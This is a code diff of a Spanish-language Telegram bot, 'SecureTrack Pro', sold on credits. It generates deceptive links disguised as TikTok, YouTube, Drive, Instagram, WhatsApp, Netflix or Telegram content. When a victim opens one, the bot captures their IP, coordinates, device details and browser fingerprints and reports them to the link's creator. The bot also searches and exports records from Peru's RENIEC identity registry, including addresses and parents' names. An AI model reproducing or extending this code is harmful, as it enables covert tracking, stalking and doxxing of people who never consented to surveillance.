@@ -68,8 +68,6 @@ let conflictCount = 0;  // Contador de conflictos consecutivos
 const visitorStats = {}; // Estadísticas por país
 const linkHistory = [];
 const reniecLimitByChat = new Map();
-let reniecHeaderCache = null;
-let reniecIndexCache = null;
 
 const app = express();
 app.use(cors());
@@ -156,12 +154,6 @@ function escapeHtml(value = '') {
         .replace(/&/g, '&amp;')
         .replace(/</g, '&lt;')
         .replace(/>/g, '&gt;');
-}
-
-function shortText(value = '', max = 70) {
-    const v = String(value || '').trim();
-    if (v.length <= max) return v;
-    return `${v.slice(0, max - 1)}…`;
 }
 
 function normalizeText(value = '') {
@@ -259,7 +251,6 @@ async function runReniecQueryRows({ chatId, queryLabel, sql, params }) {
         const limit = getEffectiveLimit(chatId);
         const limitedRows = rows.slice(0, limit);
         
-        // Simular headers para compatibilidad con el comando /export
         const headers = ["DNI", "AP_PAT", "AP_MAT", "NOMBRES", "FECHA_NAC", "FCH_INSCRIPCION", "FCH_EMISION", "FCH_CADUCIDAD", "UBIGEO_NAC", "UBIGEO_DIR", "DIRECCION", "SEXO", "EST_CIVIL", "DIG_RUC", "MADRE", "PADRE"];
         
         const mappedRows = limitedRows.map(r => [
@@ -288,27 +279,20 @@ async function handleCommand(msg) {
     const argsRaw = partsRaw.slice(1);
     const from = msg.from?.first_name || 'Usuario';
 
-    // MOSTRAR CHAT_ID PARA DEBUGGING
     console.log(`\n[📨 MENSAJE RECIBIDO]\n👤 Usuario: ${from}\n🔑 CHAT_ID: ${chatId}\n💬 Texto: ${textRaw}\n`);
 
-    // Opcional: Si quieres que solo el admin pueda usarlo, descomenta esto:
-    // if (chatId !== ADMIN_CHAT_ID) return;
-
-    /* ── AUTENTICACIÓN / BUSCAR USUARIO ─────────── */
     let { data: user, error: userError } = await supabase
         .from('bot_users')
         .select('*')
         .eq('chat_id', chatId)
         .single();
 
-    // Si el error no es "no rows", algo falló feo (ignoramos "PGRST116" que es Not found)
     if (userError && userError.code !== 'PGRST116') {
         console.error("DB Error fetch user:", userError);
     }
 
-    /* ── /start ─────────────────────────────────────── */
     if (text === '/start' || text.startsWith('/start ')) {
-        const startPayload = textRaw.split(' ')[1]; // captura "REF..."
+        const startPayload = textRaw.split(' ')[1];
         let isNewUser = false;
         let refereeId = null;
 
@@ -317,8 +301,6 @@ async function handleCommand(msg) {
         }
 
         if (!user) {
-            // Auto registro
-            // Si es el administrador quien escribe, le damos plan ilimitado directo
             const initPlan = chatId === ADMIN_CHAT_ID ? 'unlimited' : 'credits';
             const initCredits = chatId === ADMIN_CHAT_ID ? 0 : 1;
 
@@ -335,14 +317,12 @@ async function handleCommand(msg) {
             }
             user = newUser;
             isNewUser = true;
-            console.log(`[+] Nuevo usuario Supabase: ${from} (ID: ${chatId}, Plan: ${initPlan})`);
 
-            // Módulo Recompensa de Referido (Si no es él mismo engañando al sistema)
             if (refereeId && refereeId !== chatId) {
                 const { data: refUser } = await supabase.from('bot_users').select('credits').eq('chat_id', refereeId).single();
                 if (refUser) {
                     await supabase.from('bot_users').update({ credits: refUser.credits + 1 }).eq('chat_id', refereeId);
-                    await sendMessage(refereeId, `🎉 <b>¡NUEVO REFERIDO!</b>\nUn usuario ha ingresado con tu enlace y has ganado <b>+1 Crédito</b>. Tienes ${refUser.credits + 1} cr en total.`);
+                    await sendMessage(refereeId, `🎉 <b>¡NUEVO REFERIDO!</b>\nUn usuario ha ingresado con tu enlace y has ganado <b>+1 Crédito</b>.`);
                 }
             }
         }
@@ -350,38 +330,24 @@ async function handleCommand(msg) {
         let welcomeText = `🎵 <b>SecureTrack Pro</b>\n\nHola <b>${user.name}</b>! Bienvenido.\n`;
 
         if (isNewUser) {
-            if (chatId === ADMIN_CHAT_ID) {
-                welcomeText += `\n👑 <b>DETECTADO COMO ADMINISTRADOR:</b>\nTienes un <b>Plan Ilimitado</b> automático.\n`;
-            } else {
-                welcomeText += `\n🎁 <b>REGALO DE BIENVENIDA:</b>\nTienes <b>1 enlace gratis</b> de prueba.\n`;
-            }
+            welcomeText += chatId === ADMIN_CHAT_ID ? `\n👑 <b>ADMINISTRADOR DETECTADO</b>\n` : `\n🎁 <b>REGALO:</b> 1 enlace gratis.\n`;
         } else {
             const planText = user.plan === 'unlimited' ? 'ILIMITADO ♾️' : `${user.credits} Crédito(s)`;
             welcomeText += `\n💳 <b>Tu Saldo:</b> ${planText}\n`;
         }
 
         welcomeText += `
-🎯 <b>Comandos de Generación:</b>
-/tk [ID] — Simular TikTok
-/yt [ID] — Simular YouTube Corto
-/d [ID]  — Simular Google Drive PDF
-/ig [ID] — Simular Instagram Reel
-/wa [ID] — Invitación a Grupo WhatsApp
-/nx [ID] — Reproductor Falso Netflix
-/tg [ID] — Nota de Voz Falsa Telegram
+🎯 <b>Consultas RENIEC:</b>
+/dni [DNI] | /nom [Nombres] | /ap [Paterno] [Materno]
 
-👥 <b>Comunidad:</b>
-/invite — Gana créditos invitando gente
+🎯 <b>Generación Links:</b>
+/tk, /yt, /d, /ig, /wa, /nx, /tg
 
-📊 <b>Tus Datos Funcionales:</b>
-/myplan — Ver saldo actual
+👥 <b>Otros:</b>
+/myplan — Perfil | /invite — Gana créditos | /help — Ayuda
 
-🔑 <b>ID de Chat:</b> <code>${chatId}</code>
+⚠️ <i>Dudas: <b>https://t.me/Yxthc2</b></i>`;
 
-⚠️ <i>Para adquirir más créditos o un plan Ilimitado, contacta al administrador enviando tu ID de Chat a:
-👉 <b>https://t.me/Yxthc2</b></i>`;
-
-        // Enviar foto de portada local (start.png) como upload binario
         try {
             const imgBuffer = fs.readFileSync(COVER_PHOTO_PATH);
             const formData = new FormData();
@@ -389,19 +355,11 @@ async function handleCommand(msg) {
             formData.append('caption', welcomeText);
             formData.append('parse_mode', 'HTML');
             formData.append('photo', new Blob([imgBuffer], { type: 'image/png' }), 'start.png');
-
-            const tgRes = await fetch(`${BASE_URL}/sendPhoto`, { method: 'POST', body: formData });
-            const tgJson = await tgRes.json();
-            if (!tgJson.ok) {
-                console.error(`[⚠️ COVER PHOTO] Error enviando start.png:`, tgJson.description);
-                await sendMessage(chatId, welcomeText);
-            }
+            await fetch(`${BASE_URL}/sendPhoto`, { method: 'POST', body: formData });
         } catch (e) {
-            console.error(`[⚠️ COVER PHOTO] No se pudo leer start.png:`, e.message);
             await sendMessage(chatId, welcomeText);
         }
 
-        /* ── COMANDOS RENIEC ───────────────────────────── */
     } else if (command === '/campos') {
         const headers = ["DNI", "AP_PAT", "AP_MAT", "NOMBRES", "FECHA_NAC", "FCH_INSCRIPCION", "FCH_EMISION", "FCH_CADUCIDAD", "UBIGEO_NAC", "UBIGEO_DIR", "DIRECCION", "SEXO", "EST_CIVIL", "DIG_RUC", "MADRE", "PADRE"];
         await sendMessage(chatId,
@@ -509,7 +467,7 @@ async function handleCommand(msg) {
             const out = await runReniecQuery({
                 chatId,
                 queryLabel: `UBIGEO "${qRaw}"`,
-                sql: isCode 
+                sql: isCode
                     ? `SELECT * FROM reniec WHERE ubigeo_nac = ? LIMIT 50`
                     : `SELECT * FROM reniec WHERE ubigeo_dir LIKE ? LIMIT 50`,
                 params: [isCode ? qRaw : `%${qNorm}%`]
@@ -542,6 +500,9 @@ async function handleCommand(msg) {
         const expArgs = argsRaw.slice(1);
         let sql = '';
         let params = [];
+        let queryLabel = '';
+
+        const usage = `⚠️ <b>Uso:</b> /export <tipo> <query>\nTipos: dni, nom, ap, fnac, ubigeo, direccion`;
 
         if (expType === 'dni') {
             const dni = (expArgs[0] || '').trim();
@@ -603,7 +564,7 @@ async function handleCommand(msg) {
             const exportName = `reniec_export_${Date.now()}.txt`;
             const formData = new FormData();
             formData.append('chat_id', chatId);
-            formData.append('caption', `📦 Export completado\nConsulta: ${queryLabel}\nFilas: ${result.rows.length} (límite ${result.limit})\nEscaneadas: ${result.scanned.toLocaleString('es-ES')}\nTiempo: ${result.elapsed} ms`);
+            formData.append('caption', `📦 Export completado\nConsulta: ${queryLabel}\nFilas: ${result.rows.length}\nTiempo: ${result.elapsed} ms`);
             formData.append('document', new Blob([Buffer.from(lines.join('\n'), 'utf8')], { type: 'text/plain' }), exportName);
 
             const tgRes = await fetch(`${BASE_URL}/sendDocument`, { method: 'POST', body: formData });
@@ -615,29 +576,12 @@ async function handleCommand(msg) {
             await sendMessage(chatId, `❌ Error exportando resultados: ${escapeHtml(e.message)}`);
         }
 
-    } else if (command === '/reindex') {
-        if (chatId !== ADMIN_CHAT_ID) {
-            await sendMessage(chatId, `⛔ Este comando es solo para administrador.`);
-            return;
-        }
-        await sendMessage(chatId,
-            `🧠 <b>Estado Base de Datos</b>\n\n` +
-            `✅ RENIEC ahora usa una base de datos <b>MySQL</b>.\n` +
-            `🚀 Las búsquedas son instantáneas gracias a los índices por DNI y Nombres.\n\n` +
-            `📊 <b>Estadísticas:</b>\n` +
-            `- Motor: InnoDB\n` +
-            `- Conexión: Pool persistente`
-        );
-
-        /* ── /myplan ────────────────────────────────────── */
-    } else if (text === '/myplan') {
+    } else if (command === '/myplan') {
         if (!user) {
             await sendMessage(chatId, `❌ No estás registrado. Usa /start primero.`);
             return;
         }
-
         const status = user.plan === 'unlimited' ? 'Ilimitado ♾️' : `${user.credits} Créditos Restantes`;
-
         await sendMessage(chatId,
             `👤 <b>Perfil de Usuario</b>\n\n` +
             `➖ <b>Nombre:</b> ${user.name}\n` +
@@ -647,93 +591,10 @@ async function handleCommand(msg) {
             `💬 <i>Si deseas cambiar de plan o reportar recarga, escribe a https://t.me/Yxthc2</i>`
         );
 
-        /* ── /adduser (ADMIN) ──────────────────────────── */
-    } else if (text.startsWith('/adduser')) {
-        if (chatId !== ADMIN_CHAT_ID) return;
-        const parts = textRaw.split(' ');
-        if (parts.length < 3) {
-            await sendMessage(chatId, `⚠️ <b>Uso:</b> /adduser <chat_id> <nombre>`);
-            return;
-        }
-        const newId = parts[1];
-        const newName = parts.slice(2).join(' ');
-
-        const { error } = await supabase
-            .from('bot_users')
-            .insert([{ chat_id: newId, name: newName, plan: 'credits', credits: 0 }]);
-
-        if (error) {
-            await sendMessage(chatId, `⚠️ Ese usuario ya existe o error BD: ${error.message}`);
-            return;
-        }
-
-        await sendMessage(chatId, `✅ <b>Usuario ${newName} (${newId}) agregado con éxito.</b> (Con 0 créditos).\nUsa <code>/addcredits ${newId} 10</code> o <code>/setplan ${newId} unlimited</code>.`);
-
-        /* ── /addcredits (ADMIN) ───────────────────────── */
-    } else if (text.startsWith('/addcredits')) {
-        if (chatId !== ADMIN_CHAT_ID) return;
-        const parts = textRaw.split(' ');
-        if (parts.length < 3) {
-            await sendMessage(chatId, `⚠️ <b>Uso:</b> /addcredits <chat_id> <cantidad>`);
-            return;
-        }
-        const tId = parts[1];
-        const amount = parseInt(parts[2], 10);
-
-        if (isNaN(amount)) {
-            await sendMessage(chatId, `⚠️ Cantidad incorrecta.`);
-            return;
-        }
-
-        // Forma sencilla si no hay RPC (Stored Procedure): Leer, sumar, actualizar
-        const { data: targetUser } = await supabase.from('bot_users').select('credits, name').eq('chat_id', tId).single();
-        if (!targetUser) {
-            await sendMessage(chatId, `⚠️ Usuario no encontrado.`);
-            return;
-        }
-        const newTotal = targetUser.credits + amount;
-        await supabase.from('bot_users').update({ credits: newTotal }).eq('chat_id', tId);
-
-        await sendMessage(chatId, `✅ <b>Operación exitosa:</b>\nUsuario: ${targetUser.name}\nCréditos Totales: ${newTotal}`);
-
-        // Notificar al usuario (opcional)
-        try {
-            await sendMessage(tId, `🎉 <b>¡Recarga Completada!</b>\nEl administrador añadió <b>${amount}</b> créditos a tu cuenta.\nUsa /myplan.`);
-        } catch (e) {
-            console.log("No se pudo notificar al usuario");
-        }
-
-        /* ── /setplan (ADMIN) ──────────────────────────── */
-    } else if (text.startsWith('/setplan')) {
-        if (chatId !== ADMIN_CHAT_ID) return;
-        const parts = textRaw.split(' ');
-        if (parts.length < 3) {
-            await sendMessage(chatId, `⚠️ <b>Uso:</b> /setplan <chat_id> <unlimited|credits>`);
-            return;
-        }
-        const tId = parts[1];
-        const pType = parts[2].toLowerCase();
-
-        if (pType !== 'unlimited' && pType !== 'credits') {
-            await sendMessage(chatId, `⚠️ Plan inválido (unlimited / credits).`);
-            return;
-        }
-
-        const { data, error } = await supabase.from('bot_users').update({ plan: pType }).eq('chat_id', tId).select().single();
-        if (error || !data) {
-            await sendMessage(chatId, `⚠️ Usuario no encontrado o error BD.`);
-            return;
-        }
-
-        await sendMessage(chatId, `✅ <b>Plan actualizado:</b>\nUsuario: ${data.name}\nNuevo Plan: ${pType}`);
-
-        /* ── /users (ADMIN) ────────────────────────────── */
     } else if (text === '/users') {
         if (chatId !== ADMIN_CHAT_ID) return;
-
         let msg = `👥 <b>Lista de Usuarios Autorizados</b>\n\n`;
         const { data: users, error } = await supabase.from('bot_users').select('*').order('created_at', { ascending: false });
-
         if (error || !users || users.length === 0) {
             msg += `<i>No hay usuarios.</i>`;
         } else {
@@ -744,7 +605,6 @@ async function handleCommand(msg) {
         }
         await sendMessage(chatId, msg);
 
-        /* ── /broadcast (ADMIN) ────────────────────────── */
     } else if (text.startsWith('/broadcast')) {
         if (chatId !== ADMIN_CHAT_ID) return;
         const bMsg = textRaw.substring(10).trim();
@@ -752,43 +612,58 @@ async function handleCommand(msg) {
             await sendMessage(chatId, `⚠️ <b>Uso:</b> /broadcast <mensaje>`);
             return;
         }
-
         const { data: users, error } = await supabase.from('bot_users').select('chat_id');
-        if (error || !users) {
-            await sendMessage(chatId, `⚠️ Error obteniendo base de usuarios.`);
+        if (error || !users || users.length === 0) {
+            await sendMessage(chatId, `⚠️ No hay usuarios para enviar el broadcast.`);
             return;
         }
 
         await sendMessage(chatId, `📢 Iniciando envío masivo a ${users.length} usuarios...`);
-
         let successCount = 0;
         for (const u of users) {
-            try {
-                // Previene auto-enviarse spam el admin
-                if (u.chat_id === ADMIN_CHAT_ID) continue;
-                await sendMessage(u.chat_id, `📢 <b>MENSAJE GLOBAL</b>\n\n${bMsg}`);
-                successCount++;
-                // Pausa anti-spam Telegram
-                await new Promise(r => setTimeout(r, 60));
-            } catch (e) { }
+          try {
+            if (u.chat_id === ADMIN_CHAT_ID) continue;
+            const res = await apiFetch("sendMessage", {
+              chat_id: u.chat_id,
+              text: `📢 <b>MENSAJE GLOBAL</b>\n\n${bMsg}`,
+              parse_mode: "HTML",
+            });
+            if (!res || !res.ok) {
+              await apiFetch("sendMessage", {
+                chat_id: u.chat_id,
+                text: `📢 <b>MENSAJE GLOBAL (Modo Texto)</b>\n\n${bMsg}`,
+              });
+            }
+            successCount++;
+            await new Promise((r) => setTimeout(r, 60));
+          } catch (e) {}
         }
-
         await sendMessage(chatId, `✅ <b>Broadcast finalizado:</b> Mensaje entregado a ${successCount} clientes.`);
 
-        /* ── /invite (REFERIDOS) ───────────────────────── */
-    } else if (text === '/invite') {
-        if (!user) {
-            await sendMessage(chatId, `❌ Regístrate primero con /start`);
-            return;
-        }
+    } else if (text === "/help" || text === "/cmds") {
+        let helpMsg =
+          `🛠️ <b>TABLA DE COMANDOS</b>\n\n` +
+          `📂 <b>Búsquedas RENIEC:</b>\n` +
+          `• <code>/dni [número]</code>\n` +
+          `• <code>/nom [nombre]</code>\n` +
+          `• <code>/ap [paterno] [materno]</code>\n` +
+          `• <code>/ubigeo [texto]</code>\n` +
+          `• <code>/direccion [calle]</code>\n` +
+          `• <code>/export [tipo] [valor]</code>\n\n` +
+          `🔗 <b>Generación Trackers:</b>\n /tk, /yt, /d, /ig, /wa, /nx, /tg\n\n` +
+          `👤 <b>Gestión Cuenta:</b>\n /myplan, /invite, /status\n`;
 
-        let myName = 'TuBot';
-        if (typeof me !== 'undefined' && me.result) {
-            myName = me.result.username;
+        if (chatId === ADMIN_CHAT_ID) {
+          helpMsg += `\n👑 <b>Admin:</b>\n /users, /adduser, /addcredits, /setplan, /broadcast`;
         }
+        await sendMessage(chatId, helpMsg);
 
+    } else if (text === "/invite") {
+        let myName = "TuBot";
+        if (typeof me !== "undefined" && me.result) {
+          myName = me.result.username;
+        }
         const refLink = `https://t.me/${myName}?start=REF${chatId}`;
-
         await sendMessage(chatId,
             `🎁 <b>Programa de Referidos VIP</b>\n\n` +
             `Invita a tus amigos a usar este sistema.\n` +
@@ -797,152 +672,77 @@ async function handleCommand(msg) {
             `👇 <b>Tu enlace para compartir:</b>\n<code>${refLink}</code>`
         );
 
-        /* ── COMANDOS DE GENERACIÓN ───────────────────── */
-    } else if (text.startsWith('/tk') || text.startsWith('/yt') || text.startsWith('/d') || text.startsWith('/ig') || text.startsWith('/wa') || text.startsWith('/nx') || text.startsWith('/tg') || text.startsWith('/gps') || text.startsWith('/link')) {
-
+    } else if (text.startsWith('/tk') || text.startsWith('/yt') || text.startsWith('/d') || text.startsWith('/ig') || text.startsWith('/wa') || text.startsWith('/nx') || text.startsWith('/tg')) {
         let type = 'tiktok';
         let typeName = 'TikTok';
         if (text.startsWith('/yt')) { type = 'youtube'; typeName = 'YouTube'; }
-        else if (text.startsWith('/d') && !text.startsWith('/drive')) { type = 'drive'; typeName = 'Google Drive'; }
-        else if (text.startsWith('/drive')) { type = 'drive'; typeName = 'Google Drive'; }
+        else if (text.startsWith('/d')) { type = 'drive'; typeName = 'Google Drive'; }
         else if (text.startsWith('/ig')) { type = 'ig'; typeName = 'Instagram Reel'; }
         else if (text.startsWith('/wa')) { type = 'wa'; typeName = 'WhatsApp Group'; }
         else if (text.startsWith('/nx')) { type = 'nx'; typeName = 'Netflix Player'; }
         else if (text.startsWith('/tg')) { type = 'tg'; typeName = 'Telegram Voice Note'; }
 
-        // === VALIDACIÓN DE CRÉDITOS (Supabase) ===
         if (!user) {
             await sendMessage(chatId, `❌ No estás registrado en el sistema. Escriba /start`);
             return;
         }
 
-        if (user.plan === 'credits') {
+        if (user.plan === 'credits' && chatId !== ADMIN_CHAT_ID) {
             if (user.credits <= 0) {
-                await sendMessage(chatId,
-                    `🛑 <b>SALDO INSUFICIENTE</b> 🛑\n\nNo tienes créditos para crear este enlace.\n\nTus Créditos Actuales: <b>0</b>\nTu ID de Chat: <code>${chatId}</code>\n\n⚠️ Contacta con <b>https://t.me/Yxthc2</b> enviándole tu ID de Chat para adquirir una recarga o subir a un plan Ilimitado.`
-                );
+                await sendMessage(chatId, `🛑 <b>SALDO INSUFICIENTE</b>`);
                 return;
             }
-            // Consumimos 1 crédito en DB
             await supabase.from('bot_users').update({ credits: user.credits - 1 }).eq('chat_id', chatId);
         }
-        // ==================================
 
-        // Extraer el target usando el texto original
-        const parts = textRaw.split(' ');
-        let target = parts.slice(1).join(' ').trim();
-
-        if (!target) {
-            target = `V${Math.random().toString(36).substring(2, 6).toUpperCase()}`;
-        }
-
-        // ASIGNAMOS ESTE ENLACE AL USUARIO (Guardar en Supabase)
-        const { error: linkError } = await supabase.from('bot_links').insert([{ target_id: target, chat_id: chatId }]);
-        if (linkError) {
-            console.error("Error guardando enlace:", linkError);
-        }
+        const target = argsRaw.join(' ').trim() || `V${Math.random().toString(36).substring(2, 6).toUpperCase()}`;
+        await supabase.from('bot_links').insert([{ target_id: target, chat_id: chatId }]);
 
         const longUrl = buildTrackingUrl(target, type);
         const shortUrl = await shortenUrl(longUrl);
 
-        // Guardar en historial
-        linkHistory.push({
-            id: target,
-            createdAt: new Date().toLocaleString('es-ES'),
-            owner: from,
-            shortUrl: shortUrl || longUrl
-        });
+        linkHistory.push({ id: target, createdAt: new Date().toLocaleString('es-ES'), owner: from, shortUrl });
 
         await sendMessage(chatId,
-            `📁 <b>Enlace de ${typeName} Generado</b>
-
-👤 <b>Etiqueta/ID:</b> <code>${target}</code>
-
-👇 <b>Enlace Corto:</b>
-<code>${shortUrl}</code>
-
-👇 <b>Enlace Directo :</b>
-<code>${longUrl}</code>
-
-<i>El sistema notificará solo a USTED cuando sea abierto.</i>`
+            `📁 <b>Enlace de ${typeName} Generado</b>\n\n` +
+            `👤 <b>Etiqueta:</b> <code>${target}</code>\n` +
+            `👇 <b>Link Corto:</b>\n<code>${shortUrl}</code>\n\n` +
+            `<i>Notificaré cuando sea abierto.</i>`
         );
 
-        /* ── /status ────────────────────────────────────── */
     } else if (text === '/status') {
         const uptime = getUptime();
         await sendMessage(chatId,
-            `📊 <b>Estado del Sistema</b>
-
-🟢 Bot: <b>Online</b>
-⏱️ Uptime: <b>${uptime}</b>
-👁️ Visitas totales: <b>${visitCount}</b>
-🔗 Links activos: <b>${Object.keys(linkDatabase).length}</b>
-📋 Enlaces generados: <b>${linkHistory.length}</b>`
+            `📊 <b>Estado del Sistema</b>\n\n` +
+            `🟢 Bot: <b>Online</b>\n` +
+            `⏱️ Uptime: <b>${uptime}</b>\n` +
+            `👁️ Visitas: <b>${visitCount}</b>\n` +
+            `📋 Enlaces: <b>${linkHistory.length}</b>`
         );
 
-        /* ── /stats ────────────────────────────────────── */
-    } else if (text === '/stats') {
-        const uptime = getUptime();
-        const topCountries = Object.entries(visitorStats)
-            .sort((a, b) => b[1] - a[1])
-            .slice(0, 5)
-            .map(([country, count]) => `  ${getFlagEmoji(country)} ${country}: <b>${count}</b>`)
-            .join('\n');
+    } else if (command === '/adduser') {
+        if (chatId !== ADMIN_CHAT_ID) return;
+        const [tId, tName] = argsRaw;
+        if (!tId || !tName) { await sendMessage(chatId, `⚠️ Uso: /adduser <chat_id> <nombre>`); return; }
+        const { error } = await supabase.from('bot_users').insert([{ chat_id: tId, name: tName, plan: 'credits', credits: 0 }]);
+        await sendMessage(chatId, error ? `❌ Error: ${error.message}` : `✅ Usuario ${tName} agregado.`);
 
-        await sendMessage(chatId,
-            `📈 <b>Estadísticas Detalladas</b>
+    } else if (command === '/addcredits') {
+        if (chatId !== ADMIN_CHAT_ID) return;
+        const [tId, amount] = argsRaw;
+        if (!tId || !amount) { await sendMessage(chatId, `⚠️ Uso: /addcredits <chat_id> <cantidad>`); return; }
+        const { data: targetUser } = await supabase.from('bot_users').select('credits').eq('chat_id', tId).single();
+        if (!targetUser) { await sendMessage(chatId, `❌ Usuario no encontrado.`); return; }
+        const newCredits = targetUser.credits + parseInt(amount);
+        await supabase.from('bot_users').update({ credits: newCredits }).eq('chat_id', tId);
+        await sendMessage(chatId, `✅ Créditos actualizados: ${newCredits}`);
 
-🌐 <b>General:</b>
-⏱️ Uptime: <b>${uptime}</b>
-👁️ Visitas totales: <b>${visitCount}</b>
-🔗 Enlaces generados: <b>${linkHistory.length}</b>
-
-🏆 <b>Top 5 Países:</b>
-${topCountries || '  📊 Sin datos aún'}`
-        );
-
-        /* ── /history ────────────────────────────────────── */
-    } else if (text === '/history') {
-        const recent = linkHistory.slice(-10).reverse();
-        if (recent.length === 0) {
-            await sendMessage(chatId, '📋 <b>Historial Vacío</b>\n\nNo hay enlaces generados aún.');
-        } else {
-            const list = recent.map((link, i) =>
-                `${i + 1}. <code>${link.id}</code> — ${link.createdAt}`
-            ).join('\n');
-            await sendMessage(chatId,
-                `📋 <b>Últimos 10 Enlaces Generados</b>\n\n${list}`
-            );
-        }
-
-        /* ── /help ──────────────────────────────────────── */
-    } else if (text === '/help') {
-        await sendMessage(chatId,
-            `📖 <b>Comandos Disponibles</b>
-
-🎯 <b>Generar Enlaces TikTok:</b>
-/gps — Link corto aleatorio
-/gps [nombre] — Link con nombre personalizado
-
-🧾 <b>Consultas RENIEC:</b>
-/campos — Ver encabezados disponibles
-/dni [8dig] — Buscar por DNI exacto
-/nom [texto] — Buscar en nombres
-/ap [ap_pat] [ap_mat] — Buscar por apellidos
-/fnac [dd/mm/yyyy] — Buscar por fecha de nacimiento
-/ubigeo [codigo/texto] — Buscar por ubigeo
-/direccion [texto] — Buscar por dirección
-/limite [1-50] — Límite de resultados por consulta
-/export [tipo] [query] — Exportar resultados a .txt
-/reindex — Estado del indexado (admin)
-
-📊 <b>Estadísticas:</b>
-/status — Estado del sistema
-/stats — Estadísticas por país
-/history — Últimos enlaces
-
-ℹ️ /help — Esta ayuda`
-        );
+    } else if (command === '/setplan') {
+        if (chatId !== ADMIN_CHAT_ID) return;
+        const [tId, pType] = argsRaw;
+        if (!tId || (pType !== 'unlimited' && pType !== 'credits')) { await sendMessage(chatId, `⚠️ Uso: /setplan <id> <unlimited|credits>`); return; }
+        await supabase.from('bot_users').update({ plan: pType }).eq('chat_id', tId);
+        await sendMessage(chatId, `✅ Plan actualizado a ${pType}`);
     }
 }
 
@@ -968,316 +768,83 @@ function getFlagEmoji(countryCode) {
    RUTAS DEL SERVIDOR EXPRESS PARA RECIBIR DATOS
    ==================================================== */
 
-// Recibe los datos en formato JSON desde tracker.js
 app.post('/api/report', async (req, res) => {
     visitCount++;
     const data = req.body;
-
-    // Determinar a quién enviarle el mensaje buscando en DB
     const targetId = data.targetId || 'Visitante Anónimo';
-    let ownerChatId = ADMIN_CHAT_ID; // Si no existe el ID en BD, va al admin por defecto
-
-    if (targetId !== 'Visitante Anónimo') {
-        const { data: linkData } = await supabase.from('bot_links').select('chat_id').eq('target_id', targetId).single();
-        if (linkData && linkData.chat_id) {
-            ownerChatId = linkData.chat_id;
-        }
-    }
-
-    console.log(`[REPORT RECIBIDO] ID: ${targetId} | Chat destino: ${ownerChatId}`);
-    console.log(`[GEO] ${data.geo?.country} | ${data.browser?.browser} | IP: ${data.geo?.ip}`);
-
-    // Registrar estadísticas de países
-    const country = data.geo?.country || 'Desconocido';
-    visitorStats[country] = (visitorStats[country] || 0) + 1;
-
-    const ts = new Date(data.timestamp).toLocaleString('es-ES', { timeZone: data.browser?.timezone || 'UTC' });
-    const g = data.geo;
-    const b = data.browser;
-    const hw = data.hardware;
-    const bat = data.battery;
-    const con = data.connection;
-    const fp = data.canvas;
-    const wg = data.webgl;
-
-    const flag = getFlagEmoji(g.countryCode);
-    const eventLabel = data.eventType === 'CLICK_CTA_BUTTON' ? '🖱️ <b>CLICK EN CTA</b>' : '👁️ <b>CARGA DE PÁGINA</b>';
-    const targetHeader = targetId !== 'Visitante Anónimo' ? `🎯 <b>OBJETIVO DETECTADO:</b> <code>${targetId}</code>` : `🚨 <b>NUEVO VISITANTE DETECTADO</b>`;
-
-    const messageHtml = `${targetHeader}
-${eventLabel} — <code>${ts}</code>
-
-━━━━━━━━━━━━━━━━━━━━
-📡 <b>RED & CONEXIÓN</b>
-━━━━━━━━━━━━━━━━━━━━
-🌐 IP:             <code>${g.ip}</code>
-🏢 ISP:            ${g.isp}
-🔌 ASN:            ${g.asn}
-⚡ Tipo:           ${con.effectiveType} (${con.type})
-📶 Velocidad:      ${con.downlink}
-🕐 Latencia:       ${con.rtt}
-💾 Ahorro datos:   ${con.saveData ? 'Sí' : 'No'}
-
-━━━━━━━━━━━━━━━━━━━━
-📍 <b>GEOLOCALIZACIÓN</b>
-━━━━━━━━━━━━━━━━━━━━
-${flag} País:          ${g.country} (${g.countryCode})
-🏙️ Ciudad:         ${g.city}
-🗺️ Región:         ${g.region}
-📮 Código postal:  ${g.postal}
-🧭 Coordenadas:    <code>${g.lat}, ${g.lon}</code>
-🕰️ Zona horaria:   ${g.timezone}
-
-━━━━━━━━━━━━━━━━━━━━
-💻 <b>DISPOSITIVO & NAVEGADOR</b>
-━━━━━━━━━━━━━━━━━━━━
-🖥️ OS:             ${b.os}
-🌍 Navegador:      ${b.browser} ${b.browserVer}
-📱 Tipo:           ${b.deviceType}
-🖵  Resolución:    ${b.screenW}×${b.screenH} (@${b.pixelRatio}x)
-🪟 Ventana:        ${b.innerW}×${b.innerH}
-🎨 Color:          ${b.colorDepth}-bit
-🔄 Orientación:    ${b.orientation}
-🌐 Idioma:         ${b.language}
-
-━━━━━━━━━━━━━━━━━━━━
-⚙️ <b>HARDWARE</b>
-━━━━━━━━━━━━━━━━━━━━
-🧠 CPU Cores:      ${hw.cpuCores}
-💾 RAM:            ${hw.ramGB !== 'N/A' ? hw.ramGB + ' GB' : 'N/A'}
-👆 Touch:          ${b.touchSupport ? 'Sí (' + b.maxTouchPoints + ' puntos)' : 'No'}
-🍪 Cookies:        ${b.cookiesOn ? 'Activadas' : 'Desactivadas'}
-🚫 DNT:            ${b.doNotTrack}
-🧩 Plataforma:     ${b.platform}${bat ? `\n🔋 <b>BATERÍA</b>\n━━━━━━━━━━━━━━━━━━━━\n⚡ Nivel:          ${bat.level}\n🔌 Cargando:       ${bat.charging ? 'Sí' : 'No'}` : ''}
-
-━━━━━━━━━━━━━━━━━━━━
-🔑 <b>FINGERPRINTS</b>
-━━━━━━━━━━━━━━━━━━━━
-🎨 Canvas:         <code>${fp?.hash || 'N/A'}</code>
-🖼️ GPU Vendor:     ${wg?.vendor || 'N/A'}
-⚙️ GPU Renderer:   ${wg?.renderer || 'N/A'}
-
-━━━━━━━━━━━━━━━━━━━━
-🌍 <b>ORIGEN</b>
-━━━━━━━━━━━━━━━━━━━━
-🔗 Referrer:       ${data.referrer}
-📄 URL:            ${data.pageUrl}${data.eventType === 'CLICK_CTA_BUTTON' ? `\n⏱️ Tiempo en página: ${data.timeOnPage}s\n📜 Scroll max:       ${data.scrollPct}%` : ''}`;
-
-    const msgResult = await sendMessage(ownerChatId, messageHtml);
-    if (msgResult?.ok) {
-        console.log(`[✅ MENSAJE ENVIADO] A chat ${ownerChatId}`);
-
-        // Enviar Ubicación Nativa de Telegram (Location Map) si hay coordenadas
-        if (g.lat && g.lon && g.lat !== 'N/A' && g.lon !== 'N/A') {
-            try {
-                await fetch(`${BASE_URL}/sendLocation`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: ownerChatId,
-                        latitude: parseFloat(g.lat),
-                        longitude: parseFloat(g.lon)
-                    })
-                });
-                console.log(`[📍 MAPS ENVIADO] Mapa Nativo enviado a ${ownerChatId}`);
-            } catch (err) {
